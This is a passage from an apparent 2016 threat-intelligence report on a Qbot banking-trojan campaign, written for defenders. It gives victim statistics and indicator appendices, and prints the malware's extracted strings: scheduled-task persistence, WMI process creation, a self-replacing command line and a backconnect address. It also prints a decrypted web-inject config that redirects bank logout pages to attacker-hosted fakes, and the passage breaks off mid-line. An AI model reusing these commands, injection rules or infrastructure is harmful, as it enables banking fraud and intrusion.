hostname=[COMPUTERNAME]\nuser=[UserName] domain=[COMPUTERNAME] is_admin=[YES] os=[5.1.1.2600.2.0.0100]\nQbot_version=[0300.262] install_time=[13.27.37-21/01/2016] exe=[C:\\WINDOWS\\explorer.exe]\niface_0=[192.168.78.132/255.255.255.0 UP] soft=[Adobe Reader 6.0.1;006.000.001|Microsoft .NET\nFramework 2.0;2.0.50727|WebFldrs XP;9.50.7523|WinPcap 4.0.2;4.0.0.1040|Microsoft Web Publishing\nWizard 1.53;|Microsoft Visual Studio 6.0 Professional Edition;|MSN;|]\n\n\n## It will intercept banking session details and then write this data into the memory pipe\n\n\n-----\n\n## Victims\n\nThrough analysis of logs collected from the attackers’ servers, as well as domain sinkholing statistics, we were\nable to gauge the size of the botnet over a two week period in early February 2016. This analysis showed there\nbeing around 54,517 infected machines globally.\n\nThe distribution of these can be seen below (the numbers in brackets include some double counting of\ninfected machines due to the way these were logged – however, the relative proportions should be accurate).\n\n##### US (61655)\n\n CA (3426)\n\n GB (1773)\n\n BR (737)\n\n BM (426)\n\n AU (384)\n\n IE (300)\n\n SE (292)\n\n TT (263)\n\n BA (260)\n\n US 85% Other values (3087)\n\nFigure 10 - Distribution of victim IP addresses\n\n\n## Analysis showed there being around 54,517 infected machines globally\n\n\n-----\n\nThe vast majority of infections are in the United States, followed by Canada, and the UK. English speaking\ncountries represent most of the infections, with Australia and Ireland also featuring in the top 10.\n\nWe analysed a sample of the largest infections (organisations with most machines compromised). Some had\nover a thousand machines infected with the malware. The majority of these were in the ‘Academic’ sector –\ne.g. high schools and Universities. However, there was a sizable proportion in the healthcare industry too, both\nhospitals and providers such as IT service companies in the sector.\n\n##### Academic\n\n Unknown\n\n Government\n\n Healthcare\n\n Commercial\n\n Community\n\nFigure 11 - Distribution of victim sectors\n\n\n-----\n\n## Conclusions\n\nAnalysis of the latest Qbot variant shows that it\nhas continued to build on prior successes, with\nfeatures updated to include further checks and\nconditions for resilience. The current version of\nQbot has been upgraded from the version 910\nreported by Symantec: some techniques, such as\nDNS blocking and FTP infection now appear to be\nredundant; while other features, such as AntiVM, DGA and a wider range of C&C commands\nhave been introduced. It shows the authors\nare evolving Qbot to become a more proactive\nthreat, increasing persistence and polymorphic\ncapabilities over simple active AV blocking.\n\nIt is not clear how the version numbers \"300.\nXXX\" correlate to the Qbot version 910 reported\nby Symantec back in 2011. The most likely reason\nis that the old Qbot code base has been used to\nproduce the current family that uses a different\nversion range.\n\nThe actors behind this have been resourceful\nthroughout – using a large number of\ncompromised GoDaddy accounts and a continual\nregistration of Rig landing pages. They have\nbeen careful in the re-use of infrastructure and\ndomains, restricting any possible attributes\nwhich could reveal additional infrastructure.\nUsing highly-populated infrastructure is typically\nconsidered bad practice, but in this case indicates\nthat the attackers have a well-formed strategic\napproach and are able to quickly switch to new\ninfrastructure and domains when required.\n\nWhilst the current campaign has already gained\nmedia coverage, the malware itself continues to\nremain relatively under-reported within open\nsource, despite already claiming a large victim pool\nin the two-to-three months it has been active.\n\nQbot is designed with persistence and mass\ninfection in mind, seen through its polymorphic\ncapabilities and anti-VM checks. As, such we\nexpect that Qbot will continue to be a potent\nthreat over the coming months, facilitated by\nexploit kits to provide an initial infection, and\nautomated spreading to gain maximum victim\ncount.\n\n\n## Recommendations\n\nWe recommend organisations use the indicators\nprovided in Appendix A to update and search their\ndefensive systems to identify attacks.\n\n## The authors are evolving Qbot to become a more proactive threat\n\n\n-----\n\n-----\n\n## Appendix A - Indicators of attack\n\n|Compromised website|eeaforums[.]org|Col3|\n|---|---|---|\n||pavtube[.]com||\n||engeniusforum[.]com||\n||wolfgnards[.]com||\n||rtachicago[.]com||\n|Rig EK IP Addresses|46.30.43[.]213||\n||188.227.18[.]185||\n||188.227.16[.]59||\n||46.30.43[.]188||\n|Rig EK Gate Domains|{2}.naughtytimebooks[.]com||\n||{2}.dynamicwords[.]us||\n||{2}.domandvilma[.]com||\n||{2}.anthonybryanauthor[.]com||\n||{2}.gandhiprobably[.]com||\n|FTP Servers|181.224.138[.]240|gilkeyphotography[.]com|\n||162.144.12[.]241|raymondelectronics[.]com|\n||69.195.124[.]60|iaahouston1[.]com|\n||50.87.150[.]203|simnewsdaily[.]com|\n|Qbot Hardcoded C&C|stat.nickspizzade[.]com||\n||rss.dimadimapress[.]com||\n|Backconnect Server|193.111.140[.]236||\n||85.25.210[.]196||\n|Qbot MD5 Samples|b725adc8f99196000ff7aa7382803cba||\n||a8a9becf391314a92452b86cd2b9e69f||\n||1dfc0905de2dc77f69a97376f1c02f63||\n||4edf3e7885878af7fb8c1bc37b9f8a74||\n||2d2fa093dd4fb26a8d14f1906552d238||\n||56e3a96bc8695327087c9e00d97e31c8||\n||b3b496c1ba36201b63b63e02724bb193||\n||06ec0af8411d864211baff8afb117f72||\n||7f263899bdce57f67d09fb7a980867e7||\n||f29211b19cf7c2ddfd66868ec8080ed2||\n||c72f0f0b6fb25b67e007427078442bdc||\n||abe1d97ab4ae7d59074d4ee826635c0f||\n||828642e97f90d2aecc348428190885fd||\n||5a7aae53de8783aad77c80e6650a7198||\n||a5b3b4daf133972ac9cba63929aebc5b||\n\n\n-----\n\n|RIG EK Landing Pages|Col2|Col3|\n|---|---|---|\n|{2,3}.411foru[.]biz {2,3}.411foru[.]com {2,3}.411foru[.]info {2,3}.411foru[.]net {2,3}.411foru[.]org {2,3}.americansvoice[.]com {2,3}.americasvoice[.]net {2,3}.angelandthebackbeat[.]com {2,3}.angelandthebackbeats[.]info {2,3}.angelandthebackbeats[.]net {2,3}.angelandthebackbeats[.]org {2,3}.ballbutter[.]com {2,3}.beverlyhillsaestheticplasticsurgery[.]com {2,3}.drraffihovsepian[.]com {2,3}.beverlyhillsshrinkwrapliposuction[.]com {2,3}.bhapsa[.]com {2,3}.bookhotelonlinetoday[.]com {2,3}.boomer-talk[.]com {2,3}.boomerstalk[.]com {2,3}.boomersvoice[.]com {2,3}.boomersvoice[.]net {2,3}[.]candcbuilding[.]com {2,3}[.]candcplumbing[.]com {2,3}[.]casinobettingpoker[.]com {2,3}.cecate[.]net {2,3}.cio-inspired[.]com {2,3}.cioemea[.]com {2,3}.cioeurope[.]com {2,3}.cioinnovate[.]com {2,3}.cisoinspired[.]com {2,3}.cmoinspired[.]com {2,3}.csgoevent[.]com {2,3}.cortezs[.]com {2,3}.cortezs[.]net {2,3}.costcoexpress[.]com {2,3}.cpoinspired[.]com {2,3}.creinspired[.]com {2,3}.csgoclimb[.]ru {2,3}.csgohs[.]ru {2,3}.dandymanscrubs[.]com {2,3}.dandyscrub[.]com {2,3}.dandyscrubs[.]com {2,3}.doctorraffi[.]com {2,3}.drhovsepian[.]com {2,3}.drhovsepianbeverlyhillsbotchedme[.]com {2,3}.drhovsepianbeverlyhillsbotchedmeup[.]com {2,3}.drhovsepianbeverlyhillsexperience[.]com {2,3}.drhovsepianbeverlyhillsreview[.]com {2,3}.drhovsepianbeverlyhillsreviews[.]com {2,3}.drhovsepianbotched[.]com {2,3}.drhovsepianbotchedme[.]com {2,3}.drhovsepianbotchedmeup[.]com {2,3}.drhovsepianplasticsurgeon[.]com {2,3}.drhovsepianplasticsurgery[.]com {2,3}.drhovsepianreview[.]com {2,3}.drhovsepianreviews[.]com|{2,3}.drhovsepianruinedme[.]com {2,3}.drraffibeverlyhills[.]com {2,3}.drraffibeverlyhillsbotched[.]com {2,3}.drraffibeverlyhillsbotchedme[.]com {2,3}.drraffibeverlyhillsbotchedmeup[.]com {2,3}.drraffibeverlyhillsreview[.]com {2,3}.drraffibeverlyhillsreviews[.]com {2,3}.drraffibotched[.]com {2,3}.drraffibotchedme[.]com {2,3}.drraffibotchedmeup[.]com {2,3}.beverlyhillsaestheticplasticsurgeryassociates[.]com {2,3}.drraffihovsepianbeverlyhillsbotched[.]com {2,3}.drraffihovsepianbeverlyhillsbotchedme[.]com {2,3}.drraffihovsepianbeverlyhillsbotchedmeup[.]com {2,3}.drraffihovsepianbeverlyhillsexperience[.]com {2,3}.facilitiesmanagementforum[.]com {2,3}.fm-inspired[.]com {2,3}.fminnovate[.]com {2,3}.fmpevent[.]com {2,3}.godbetter[.]com {2,3}.godbigger[.]com {2,3}.godonlinetv[.]com {2,3}.hernandezenterprise[.]com {2,3}.hernandezenterprise[.]info {2,3}.hernandezenterprise[.]mobi {2,3}.hernandezenterprise[.]net {2,3}.hernandezenterprise[.]org {2,3}.hr-inspired[.]com {2,3}.inspiredbusinessmedia[.]com {2,3}.internetmarketingenterprise[.]net {2,3}.justportraits[.]ca {2,3}.lifewavechina[.]com {2,3}.lifewavedenmark[.]com {2,3}.lifewavedistributor[.]com {2,3}.lifewaveforever[.]com {2,3}.lifewaveindia[.]com {2,3}.lifewaveuk[.]com {2,3}.listentoamericans[.]com {2,3}.listentoamericans[.]net {2,3}.lowtechinternational[.]com {2,3}.marcelohernandez[.]net {2,3}.marcelohernandez[.]org {2,3}.messifootball[.]com {2,3}.messimessimessi[.]com {2,3}.messistar[.]com {2,3}.messistars[.]com {2,3}.mlmbonus[.]com {2,3}.modernhide[.]com {2,3}.mushroomalley[.]com {2,3}.my-voice[.]net {2,3}.myvoiceamerica[.]com {2,3}.myvoiceusa[.]com {2,3}.ofcource[.]com {2,3}.olecram[.]info {2,3}.olecram[.]org {2,3}.olecramproductions[.]info|{2,3}.olecramproductions[.]net {2,3}.olecramproductions[.]org {2,3}.onlineredwine[.]com {2,3}.onlyportraits[.]com {2,3}.revivearizona[.]com {2,3}.reviveindiana[.]net {2,3}.reviveindiana[.]org {2,3}.revivejerusalem[.]org {2,3}.revivelondon[.]org {2,3}.revivemilwaukee[.]org {2,3}.reviveminnesota[.]com {2,3}.reviveminnesota[.]info {2,3}.reviveminnesota[.]net {2,3}.reviveminnesota[.]org {2,3}.revivemississippi[.]net {2,3}.revivemississippi[.]org {2,3}.revivemsp[.]org {2,3}.reviverichmondca[.]org {2,3}.revivesarasota[.]org {2,3}.reviveseattle[.]org {2,3}.revivesoutherncaribbean[.]com {2,3}.revivesoutherncaribbean[.]org {2,3}.revivetheholyland[.]com {2,3}.revivetheholyland[.]org {2,3}.revivethepromisedland[.]com {2,3}.revivethepromisedland[.]org {2,3}.revivetupelo[.]com {2,3}.revivetupelo[.]org {2,3}.revivetwincities[.]org {2,3}.revivewisconsin[.]org {2,3}.rudedogbrewery[.]com {2,3}.rudedogbrewery[.]info {2,3}.rudedogbrewery[.]net {2,3}.rudedogbrewery[.]org {2,3}.rudedogbrewing[.]co {2,3}.rudedogbrewing[.]net {2,3}.rustywallacefordtennessee[.]com {2,3}.saveonfordtrucks[.]com {2,3}.saveonscion[.]com {2,3}.saveontoyotas[.]com {2,3}.sda-courier24[.]biz {2,3}.sdacourier[.]info {2,3}.senior-voice[.]com {2,3}.sexlag[.]com {2,3}.shoprustywallace[.]com {2,3}.shoprustywallaceford[.]com {2,3}.silent-majority[.]net {2,3}.sportsbettingrace[.]com {2,3}.trackbonus[.]com {2,3}.utalkhere[.]com {2,3}.utalkhere[.]net {2,3}.year2018[.]com {2,3}.year2019[.]com {2,3}.year2023[.]com {2,3}.year2024[.]com|\n\n\n-----\n\n|Qbot Active DGAs (S) = Sinkhole|Col2|Col3|Col4|\n|---|---|---|---|\n|Domain|10-Day Start Date|Domain|10-Day Start Date|\n\n\nfgmbdteifejszcmn[.]org\nhyfotrom[.]biz\nvvdpprlurgnja[.]biz\nuitutnmieyxfk[.]org\nvzdrlswljtpgsmvddeehav[.]org\nnknpagmexfmpivpfkej[.]org\nshehtaamozvljiemrijsgzff[.]com\nosnyjaaliqdpegehd[.]com\ngvyxwaslgliazuilhtyl[.]com\nnkwnfcvlqvouqyspcpfxdbmkv[.]org\nvxozgiucpq[.]com\npgnioogwlucnv[.]com\nhhwkqccfvmbxvgsrfodzblfk[.]org\ntnqnpjthcwhhit[.]biz (S)\nohnzjsjoyxmkfpafaouujked[.]biz (S)\npzmftmgqnxaqgrznm[.]net\nhvjhbdtxslkr[.]net (S)\nfbptaqbegdpqfkqeniulcz[.]com\nuzjwupjsjfpcezlchdsmzodkm[.]org\nohjnxkcqhyzcqxoxyrqsvmovb[.]org\ntybsrwyftchsd[.]biz\nbrpnkctjvgdmnbwtv[.]biz\nyliolxjywjpmtpxwkcsc[.]biz\nczkwuxvndxrjsprm[.]org\nreckchfhtndingqrynjdgpbjy[.]net\njhsjqyopeiivfjonxfd[.]com\nfrcblvtmpuygvxzdjsdw[.]net\nbzkgskajhmcwrbk[.]net\nxykrgjnhkhjgpkdi[.]net\ngfsbfuaogfwrcvstpnvuskqjh[.]net\nusobtaaxtdkpzqqvkahae[.]com\nizfrynscrek[.]net\nzlczwkjposmtcawsga[.]org\nqfdjjouamlbqtfyewaxci[.]org\nvpsbrubhqlrpqfnadsvc[.]net\npptyqmktluqnpameptwtzno[.]org\nkvwyoivqwydfdlpzd[.]org\nnwqsckeoatb[.]biz\nbryhitenwzmdtakavoofanp[.]org\nonpzjbvxnbvuhrjbjb[.]info\nhyfpcoogiuxackrjlvqfoa[.]org\nbogtdrfdeqabyyxdg[.]net\nhtibkjlyhffmhnetwvaia[.]net\njaxmksttqwcfycm[.]org\njdqmdauuzavhvzmchymtn[.]com\naifrbgvit[.]org\nzvwidimzmcbsrdbrtk[.]org\nuisfhfwqrcsqcvo[.]org\ngkvimqrvoscnuvggw[.]net\nhihybiipewmutcpqjsnnn[.]org\nlssteedshlf[.]org\nrhjbkrqiekhdxlgzrzdzw[.]net (S)\nttzioiyzupuntyceqbwqr[.]org\naoznszhhyhktgb[.]com\nohpjbauaztbcqjwbxyepjg[.]info\nf b [ ]\n\n\n21/09/2015\n21/09/2015\n01/10/2015\n01/10/2015\n21/10/2015\n21/10/2015\n01/11/2015\n01/11/2015\n01/11/2015\n11/11/2015\n11/11/2015\n21/11/2015\n21/11/2015\n01/12/2015\n01/12/2015\n01/12/2015\n01/12/2015\n01/12/2015\n01/12/2015\n01/12/2015\n01/12/2015\n01/12/2015\n01/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n11/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n21/12/2015\n01/01/2016\n01/01/2016\n01/01/2016\n01/01/2016\n01/01/2016\n01/01/2016\n01/01/2016\n\n\nljiececesruwqsiaafspjb[.]biz\nuvaphhxjmijvuvobqfezgnc[.]com\ncoxrwiuxkcausxnlbgjmakxrw[.]net\ndslmkpgjvuisnqa[.]com\ndpsjwmwzuwnicaq[.]biz\ngjcybzvmvir[.]com\ndrufxhimmwwnfhegujbutyw[.]com\nyqwjvhxgaiszygziq[.]org\ngdfqutzvshhgzheqksxj[.]biz\nmzvmmsedkr[.]biz\nrkdxaovlaoltxnorwhtqo[.]com\noxpsuqkej[.]org\nvcavovfkbnxdi[.]org\nnyqvjyehgmyzwsutaoeqrzdff[.]net\nvyffojtfi[.]net\ndkdjezurex[.]org (S)\nhbjzvgyej[.]org (S)\nyuhjomyygtrbcr[.]info (S)\naecfdpuspicop[.]biz (S)\nxkwczygvqosxx[.]com\ngfapuxkfzsddekagqyvtibckx[.]org\nlzxrbgvcpdefafmtkmypd[.]org\nkzdmlrtrdfmuvyczjeoysnnr[.]com\njyemfaceteeg[.]info\nkyimozmtezqaghxaqbykf[.]net\nriiqynnpolhrrqtjq[.]com\nbwzxubzdgaq[.]biz\nyrkinsiwejn[.]biz\nwybmdazfdaapjtabgbamyuq[.]biz (S)\njfgsifrptbirusgs[.]net\nzwdhqcthdwlugocbiqn[.]info\ndejyjcwo[.]info\nqotavczeb[.]info (S)\npqmqomkgjnfdng[.]org (S)\nejnkyujcazyyrehecjmox[.]net (S)\njghgaukpemdsitwrbkm[.]org (S)\nrdnzplgrz[.]net (S)\nbbostybfmaa[.]org\noeisvpck[.]com\nfelruzatqofkxlzkrskrbcilq[.]org\nwalmgvyongcjrfpjjlwiweyiv[.]biz\noabtwabgoyatl[.]info\nljiececesruwqsiaafspjb[.]biz\nuvaphhxjmijvuvobqfezgnc[.]com\ncoxrwiuxkcausxnlbgjmakxrw[.]net\ndslmkpgjvuisnqa[.]com\ndpsjwmwzuwnicaq[.]biz\ngjcybzvmvir[.]com\ndrufxhimmwwnfhegujbutyw[.]com\nyqwjvhxgaiszygziq[.]org\nakurktsicohzxrfoynqaixspe[.]org\nawtptzoblgkkdmfb[.]biz\nbdbprqhsomsonztxios[.]net\ndfnchvkjlzlkdaygzdakqhn[.]info (s)\ndtvsxudgnort[.]biz\nj k t b[ ] t\n\n\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n21/01/2016\n21/01/2016\n21/01/2016\n21/01/2016\n21/01/2016\n21/01/2016\n21/01/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n01/02/2016\n11/02/2016\n11/02/2016\n11/02/2016\n11/02/2016\n11/02/2016\n11/02/2016\n11/02/2016\n11/02/2016\n11/02/2016\n11/02/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n11/01/2016\n21/02/2016\n21/02/2016\n21/02/2016\n21/02/2016\n21/02/2016\n21/02/2016\n\n\n-----\n\n## Appendix B - Critical strings block:\n\n\n% u . % s . % s . % 0 8 x . A D M I N $ . n e t t e l l e r. c o m . N t U n m a p V i e w O f S e c t i o n . s i n k h o l e . S O F T WA R E \\ M i c r o s o f t \\\nWindows\\CurrentVersion\\Run.Self test OK..HOURLY /mo 15.cashmanagementconnectionstring.\npane.bankofamerica.com;paper.citi.com;www.u43.pnc.com;emstatics.bancsabadell.com;jbmd.tiaac r e f . o r g ; f b d s 7 . t a n g e r i n e . c a ; g r o u n d . c i t i . c o m ; p a p e r. c i t i b a n k . c o m ; t p p a . b m o . c o m ; w e x 8 . s u n t r u s t .\ncom;campaign.lloydsbank.co.uk;ebank.apsbank.com.mt;portal.accountonline.com;www2.americafirst.\nc o m ; e m s t a t i c s . b a n c s a b a d e l l . c o m ; d e s t e k . y a p i k r e d i . c o m . t r ; w w w 3 . b a n k l i n e . n a t w e s t . c o m ; w w w 7 .\nn w o l b . c o m ; i d e a l . i n g . n l ; w w 7 . h a n c o c k b a n k . c o m ; / r e d i r t e s t e c a s h . . N t C l o s e . n a t t u n _ n e x t _ c o n n e c t _\ntime.%windir%\\explorer.exe.Administrator.cscript.exe.Set objWMIService = GetObject(\"winmgmts:\" &\n\"{impersonationLevel=impersonate}!\\\\.\\%coot\\cimv2\").Set colFiles = objWMIService.ExecQuery(\"Select\n\n- From CIM_DataFile Where Name = '%s'\").For Each objFile in colFiles.objFile.Copy(\"%s\").Next.\nNtCreateSection.%windir%\\SysWOW64\\explorer.exe.%s\\%s.vbs.193.111.140.236:65200.tcpdump.exe;windump.\nexe;ethereal.exe;wireshark.exe;ettercap.exe;rtsniff.exe;packetcapture.exe;capturenet.exe;wireshark.\nexe.protoversion=%u&r=1&n=%s&os=%s&bg=%s&it=%u&qv=%04x.%u&ec=%s&av=%u&salt=%s.cmd.\nexe /C \\\"start /MIN %s\\system32\\cscript.exe //E:javascript \\\"%s\\\"\\\".c:\\pagefile.sys.bak2.txt.stat.nickspizza\nde.com. /c ping.exe -n 6 127.0.0.1 & type \"%s\\\\System32\\\\autoconv.exe\" > \"%s\" & del /F /Q \"%s\".IPC$./cgi-bi\nn / g w 2 . p l . l u _ s e c l o g . % % % B O T _ N I C K % % % . { % 0 2 X % 0 2 X % 0 2 X % 0 2 X - % 0 2 X % 0 2 X - % 0 2 X % 0 2 X %02X%02X-%02X%02X%02X%02X%02X%02X}.\"%s\\system32\\schtasks.exe\" /create /tn %s /tr \"%s\" /\nsc %s.protoversion=%u&r=2&n=%s&tid=%u&rc=%d&rdescr=%s.error res='%s' err_code=%d len=%u.\n/F.%s %04x.%u %04x.%u res: %s seh_test: %u.%ProgramFiles%\\Internet Explorer\\iexplore.exe.Self\ntest FAILED!!!.%BOTID%.KoFGsdF8^yhce(ncCxxw.HOURLY /mo 7.Set objWMIService = GetObject(\"winm\ngmts:\" & \"{impersonationLevel=impersonate}!\\\\.\\%coot\\cimv2\").Set objProcess = GetObject(\"winmgmts:root\\\ncimv2:Win32_Process\").errReturn = objProcess.Create(\"%s\", null, nul, nul).C$.lu_si.wpcap.dll.\nNtMapViewOfSection. /ru \"\". /c ping.exe -n 6 127.0.0.1 & type \"%s\\\\System32\\\\autoconv.exe\" > \"%s\".\ncmd /c schtasks.exe /Query - \"%s\".rapportgp.%ProgramFiles(x86)%\\Internet Explorer\\iexplore.exe.\n\n\n-----\n\n## Appendix C - Targeted banks\n\nThe list of targeted banks is primarily aimed at the US, and has limited scope when comparing to other\nfinancial malware such as Dridex. Below are the banks which are currently targeted by Qbot:\n\n\ntdetreasury.tdbank.com, cmoltp.bbt.com, cashmanageronline.bbt.com, .hsbcnet.com, ebc_ebc, blilk.com, bankeft.com, cmol.bbt.\ncom, securentrycorp.zionsbank.com, tmcb.zionsbank.com, .web-access.com, nj00-wcm, commercial.bnc.ca, /clkccm/, paylinks.cunet.\norg, e-facts.org, accessonline.abnamro.com, providentnjolb.com, firstmeritib.com, corporatebanking, firstmeritib.com/defaultcorp.\naspx, e-moneyger.com, jsp/mainWeb.jsp, svbconnect.com, premierview.membersunited.org, each.bremer.com, iris.sovereignbank.\ncom, /wires/, paylinks.cunet.org, securentrycorp.amegybank.com, businessbankingcenter.synovus.com, businessinternetbanking.\nsynovus.com,ocm.suntrust.com, otm.suntrust.com, cashproonline.bankofamerica.com, singlepoint.usbank.com, netconnect.\nbokf.com, business-eb.ibanking-services.com, cashproonline.bankofamerica.com, /cashplus/, ebanking-services.com, /cashman/,\nweb-cashplus.com, treas-mgt.frostbank.com, business-eb.ibanking-services.com, treasury.pncbank.com, access.jpmorgan.com,\ntssportal.jpmorgan.com, ktt.key.com, onlineserv/CM, premierview.membersunited.org, directline4biz.com, .webcashmgmt.com,\ntmconnectweb, moneymanagergps.com, ibc.klikbca.com, directpay.wellsfargo.com, express.53.com, ctm.53.com, itreasury.regions.\ncom, itreasurypr.regions.com, cpw-achweb.bankofamerica.com, businessaccess.citibank.citigroup.com, businessonline.hunting­\nton.com, /cmserver/, goldleafach.com, iachwellsprod.wellsfargo.com, achbatchlisting, /achupload, commercial2.wachovia.com,\ncommercial3.wachovia.com, commercial4.wachovia.com, wc.wachovia.com, commercial.wachovia.com, wcp.wachovia.com, chsec.\nwellsfargo.com, wellsoffice.wellsfargo.com, /ibws/, /stbcorp/, /payments/ach, trz.tranzact.org, /wiret, /payments/ach, cbs.firstciti­\nzensonline.com, /corpach/, scotiaconnect.scotiabank.com, webexpress.tdbank.com, businessonline.tdbank.com, /wcmpw/, /wcmpr/,\n/wcmtr/, tcfexpressbusiness.com, trz.tranzact.org\n\n\n-----\n\n## Appendix D - Online banking injection logic\n\nFor injecting into online banking services, the logic is defined within an encrypted resource, named IDB_\nBITMAP3. Below is the decrypted content of this resource:\n\n\nset_url https://*.jpmorgan.com/*logoff* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*/cmserver/logout.cfm* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://express.53.com/express/logoff.action* GPR https://express.53.com/express/logon.jsp\n\nset_url https://businessaccess.citibank.citigroup.com/cbusol/quit.do* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://businessaccess.citibank.citigroup.com/cbusol/signOff.do* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://singlepoint.usbank.com/cs70_banking/logon/sbbExit/logout.do* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*citizensbankmoneymanagergps.com/cb/servlet/cbonline/jsp/invalidate-session.jsp* GPR https://www2.citizensbankmoneymanagergps.com\n\nset_url https://www#.citizensbankmoneymanagergps.com/cb/servlet/cbonline/LogEZDExit* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://ktt.key.com/ktt/cmd/logoff* GPR https://www.key.com/html/business-banking.html\n\nset_url https://cashproonline.bankofamerica.com/cpwportal/terminateSession.jsp* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://top.capitalonebank.com/cashplus/security?*Logout* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://cbs.firstcitizensonline.com/cb/servlet/cbonline/invalidate-session.jsp* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://www.corporatebanking.firsttennessee.com/cb/servlet/cbonline/jsp/invalidate-session.jsp* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://otm.suntrust.com/stbcorp/logon/cpExit* GPR https://www.suntrust.com\n\nset_url https://ocm.suntrust.com/sunt/logon/sbbExit* GPR https://www.suntrust.com\n\nset_url https://e-access.compassbank.com/bbw/cmserver/logout.cfm* GPR https://www.compassbank.com\n\nset_url https://treasurydirect.soc.tdbank.com/bbw/cmserver/logout.cfm* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://wellsoffice.wellsfargo.com/ceoportal/framework/ceo_logout.jsp* GPR https://www.wellsfargo.com/com/\n\nset_url https://*.ebanking-services.com/nubi/SignOut.aspx* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*.ebanking-services.com/nubi/SignIn.aspx?timeout=y* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://business-eb.ibanking-services.com/K1/logout.jsp* GPR https://business-eb.ibanking-services.com/K1/\n\nset_url https://business-eb.ibanking-services.com/K1/servlet/com.brokatfs.typhoon.htmlinf.servlet.CustLogoffServlet* GPR https://business-eb.ibanking-services.com/K1/\n\nset_url https://tcfexpressbusiness.com/bbw/cmserver/logout.cfm* GPR https://tcfexpressbusiness.com/bbw/cmserver\n\nset_url https://treas-mgt.frostbank.com/rdp/cgi-bin/logout* GPR https://treas-mgt.frostbank.com/rdp/cgi-bin/welcome.cgi\n\nset_url https://treas-mgt.frostbank.com/rdp/cgi-bin/welcome.cgi?loggedOff=True* GPR https://treas-mgt.frostbank.com/rdp/cgi-bin/welcome.cgi\n\nset_url https://businessonline.huntington.com/BOLHome/LogoutIntercept.aspx* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://businessonline.huntington.com/bolhome/BusinessOnlineAutoLogoff.aspx* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://webinfoplus.mandtbank.com/cashplus/security?requestID=Logout* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://businessonline.tdbank.com/CorporateBankingWeb/Core/SessionTimeout.aspx* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://businessonline.tdbank.com/CorporateBankingWeb/Core/Logout.aspx* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://www.scotiaconnect.scotiabank.com/scoui/pki/LogoutFromSCO.bns* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://www.firstmeritib.com/Logout.aspx* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://www.firstmeritib.com/cb/servlet/cbonline/jsp-ns/redirectFM.jsp?Page=Logoff* GPR https://www.firstmeritib.com/AccountListings.aspx\n\nset_url https://www.easterntreasuryconnect.com/bbw/cmserver/logout* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*/wcmfd/wcmframework/TrapFunctionality?functionalityURL=/wcmfd/wcmframework/Signoff* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*/wcmfd/wcmframework/Signoff* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://www.abnamro.nl/nl/logon/logoff.html* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*treasury.pncbank.com/TSCMCWeb/logoutMC.htm* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*/TMConnectWeb/cgi-bin/logoutconfirm.cgi* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*/TMConnectWeb/cgi-bin/logout.cgi* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://goldleafach.com/ach/Logout.aspx* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*svbconnect.com/LogoutServlet/* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*.web-cashplus.com/Cashplus/*Logout* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*/cmserver/logout.cfm* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://weblink.websterbank.com/weblink/logout.asp* GPR https://www.websteronline.com/small-business/smallbusiness-homepage.html\n\nset_url https://*/CLKCCM/*/exit.asp* GPR http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\nset_url https://*.secure.fundsxpress.com/piles/fxweb.pile/exit* GPR 